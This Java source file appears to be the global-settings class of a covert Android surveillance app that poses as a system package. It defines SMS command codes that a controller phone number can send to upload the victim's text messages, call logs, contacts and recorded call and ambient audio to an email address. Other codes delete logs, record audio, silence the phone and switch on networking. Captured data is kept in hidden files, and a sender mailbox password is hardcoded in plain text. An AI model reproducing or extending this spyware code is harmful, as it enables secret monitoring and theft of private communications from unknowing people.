package com.android.system.controled;

import java.io.File;
import java.util.List;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.util.Log;

import com.android.system.controled.service.ListenService;
import com.android.system.controled.util.DoAboutCodeUtils;
import com.android.system.controled.util.FileUtil;

public class Globle {

//	public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
	public static final String PHONE_NUMBER = "5554";// 控制者的电话号码

	/**
	 * 发送者的email和密码，163邮箱
	 */
	// public final static String senderName = "little__gg@163.com";
	// public final static String senderPwd = "6803895199";

	public final static String senderName = "control_app@163.com";
	public final static String senderPwd = "control_app1$!";

	/**
	 * 接收者的email
	 */
	public final static String receiverEmail = "craining@163.com";

	public static final String PHONE_CODE_UP = "011";// TURN_UP
	public static final String PHONE_CODE_DOWN = "012";// TURN_DOWN
	public static final String PHONE_CODE_CALL_ME = "013";// CALL_ME

	public static final String PHONE_CODE_RECORD_TIME = "015:";// RECORD_TIME:
	public static final String PHONE_CODE_RECORD_START = "016";// RECORD_START
	public static final String PHONE_CODE_RECORD_END = "017";// RECORD_END

	public static final String PHONE_CODE_DELETE_MSG_LOG = "021";// DEL_MSG
	public static final String PHONE_CODE_DELETE_CALL_LOG = "022";// DEL_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "023";// DEL_AUDIO_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "025";// DEL_AUDIO_OTHER
	public static final String PHONE_CODE_DELETE_ALL_LOG = "026";// DEL_ALL

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "031";// HELLO_SMS_CALL
	public static final String PHONE_CODE_UPLOAD_ALL = "032";// HELLO_ALL
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "033";// HELLO_CALL_AUDIO
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "035";// HELLO_OTHER_AUDIO
	public static final String PHONE_CODE_UPLOAD_CONTACTS = "036";// HELLO_CONTACTS
	
	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "031M";// HELLO_SMS_CALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "032M";// HELLO_ALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "033M";// HELLO_CALL_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "035M";// HELLO_OTHER_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "036M";// HELLO_CONTACTS_MOBILE
	
	public static final String PHONE_CODE_TURNON_WIFI = "057";// TURN_ON_WIFI
	public static final String PHONE_CODE_TURNON_MOBILE = "056";// TURN_ON_MOBILE

	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";

	public static final File FILE_CALL_LOG = new File("/mnt/sdcard/Android/.androidcall.txt");
	public static final File FILE_CONTACTS = new File("/mnt/sdcard/Android/.contacts.txt");
	public static final String FILEPATH_AUDIOS_CALL = "/mnt/sdcard/Android/.callaudios/";
	public static final String FILEPATH_AUDIOS_OTHER = "/mnt/sdcard/Android/.audios/";
	public static final File FILE_TAG_UPLOAD_TAG = new File("/data/data/com.android.system.controled/files/uploadtag.cfg");
	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";

	/**
	 * 调最大音量
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnUpMost(Context context) {
		Log.e("Globle", "turnUpMost");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		audioMgr.setStreamVolume(AudioManager.STREAM_RING, audioMgr.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
		audioMgr.setStreamVolume(AudioManager.STREAM_NOTIFICATION, audioMgr.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);
		audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_ON);
	}

	/**
	 * 调大音量
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnUpSecond(Context context) {
		Log.e("Globle", "turnUpSecond");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		audioMgr.setStreamVolume(AudioManager.STREAM_RING, audioMgr.getStreamMaxVolume(AudioManager.STREAM_RING) - 2, 0);
		audioMgr.setStreamVolume(AudioManager.STREAM_NOTIFICATION, audioMgr.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION) - 2, 0);
		audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_ON);

	}

	/**
	 * 静音模式
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnDown(Context context) {
		Log.e("Globle", "turnDown");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_SILENT);// 静音模式、不震动
		// audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_OFF);
	}

	/**
	 * 还原之前音量模式
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnPre(Context context) {
		Log.e("Globle", "turnPre");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
	}

	/**
	 * 开启后台监听服务
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zgy
	 * @date:2012-8-30
	 */
	public static void startBackService(Context context) {
		if (!isServiceStarted(context, SERVICE_NAME_LISTEN)) {
			Intent i = new Intent(context, ListenService.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(i);
			Log.v("service", "service is not running, need to start service!");
		} else {
			Log.v("service", "service is running, no need to start service!");
		}

	}

	public static void checkUploadedOrNot(Context context) {
		if (Globle.FILE_TAG_UPLOAD_TAG.exists()) {
			DoAboutCodeUtils.doOperaByMessage(context, FileUtil.read(FILENAME_TAG_UPLOAD_TAG, context));
		}
	}

	/**
	 * 通过Service的类名来判断是否启动某个服务
	 * 
	 * @param mServiceList
	 * @param className
	 * @return
	 */
	public static boolean isServiceStarted(Context context, String serviceName) {

		ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningServiceInfo> mServiceList = activityManager.getRunningServices(100);

		for (int i = 0; i < mServiceList.size(); i++) {
			if (serviceName.equals(mServiceList.get(i).service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	/**
	 * 
	 * 判断Wifi网络状态是否可用
	 * 
	 * @return true:网络可用; false:网络不可用
	 */

	public static boolean isConnectInternetWifi(Context con) {
		ConnectivityManager conManager = (ConnectivityManager) con.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = conManager.getActiveNetworkInfo();
		if (networkInfo != null) { // 注意，这个判断一定要的哦，要不然会出错
			if (networkInfo.isAvailable()) {
				State wifi = conManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState();
				if (wifi == State.CONNECTED) {
					return true;
				}
			}
		}

		return false;
	}
}
